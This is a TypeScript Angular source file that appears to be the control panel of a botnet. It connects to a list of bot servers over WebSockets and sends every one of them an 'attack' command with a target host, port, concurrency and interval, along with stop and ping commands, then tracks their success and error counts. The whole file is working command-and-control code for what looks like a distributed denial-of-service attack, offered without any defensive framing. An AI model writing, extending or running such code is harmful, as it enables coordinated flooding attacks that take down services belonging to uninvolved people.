import { HttpClient } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { first, interval, map, Observable, Subject, takeUntil, tap } from 'rxjs';

export type UpdateNotifierSendInfoType = 'stats' | 'pingResponse';

export interface UpdateNotifierSendInfo {
    type: UpdateNotifierSendInfoType;
    data?: any;
}

export class Bot {
  private socket: WebSocket;
  private readonly destroyed$ = new Subject<void>();
  private readonly pingInterval = 20000;

  loop: number;
  success: number;
  error: number;
  status: 'working' | 'idle' | 'offline';
  target: AttackInfo | null;

  constructor(public readonly botUrl: string) {
    const wshost = botUrl.replace(/^http/, 'ws');

    this.loop = 0;
    this.error = 0;
    this.success = 0;
    this.status = 'idle';
    this.target = null;

    this.socket = new WebSocket(wshost);
    this.socket.onclose = () => this.status = 'offline';
    this.socket.onmessage = (ev) => this.onMessage(ev.data ? JSON.parse(ev.data) : null);
    this.socket.onopen = () => this.onConnect();

    this.destroyed$.pipe(
      first()
    ).subscribe(() => {
      this.socket.removeAllListeners?.();
      this.socket.close();
    });
  }

  attack(info: AttackInfo) {
    if(this.status !== 'offline') {
      this.socket.send(JSON.stringify({cmd: 'attack', data: info}));
      this.status = 'working';
      this.target = info;
    }
  }

  stop() {
    if(this.status !== 'offline') {
      this.socket.send(JSON.stringify({cmd: 'stop', data: null}));
      this.status = 'idle';
      this.target = null;
    }
  }

  destroy() {
    this.destroyed$.next();
    this.destroyed$.complete();
  }

  private onMessage(info: UpdateNotifierSendInfo) {
    switch(info.type) {
      case 'stats':
        this.onStatsUpdate(info.data);
        break;
    }
  }

  private onStatsUpdate(data: any) {
    this.loop = data.loop;
    this.success = data.success;
    this.error = data.error;
    this.target = data.target;

    if(this.target) {
      this.status = 'working';
    } else {
      this.status = 'idle';
    }
  }

  private onConnect() {
    console.log('Client connected');

    interval(this.pingInterval).pipe(
      takeUntil(this.destroyed$),
    ).subscribe(() => {
      this.socket.send(JSON.stringify({cmd: 'ping'}));
    })
  }
}

export interface AttackInfo {
  host: string;
  port: number;
  concurrency?: number;
  interval?: number;
}

@Injectable({
  providedIn: 'root'
})
export class AppService {
  readonly botList: Bot[] = [];

  constructor(private httpClient: HttpClient) { }

  refreshList() {
    this.httpClient.get<string[]>('/api/control').pipe(
      tap(botUrls => {
        botUrls.forEach(url => {
          if(!this.botList.find(b => b.botUrl === url)) {
            this.botList.push(new Bot(url));
          }
        });
      }),
      first(),
    ).subscribe();
  }

  attack(info: AttackInfo) {
    this.botList.forEach(bot => {
      bot.attack(info);
    });
  }

  stop() {
    this.botList.forEach(bot => {
      bot.stop();
    });
  }
}
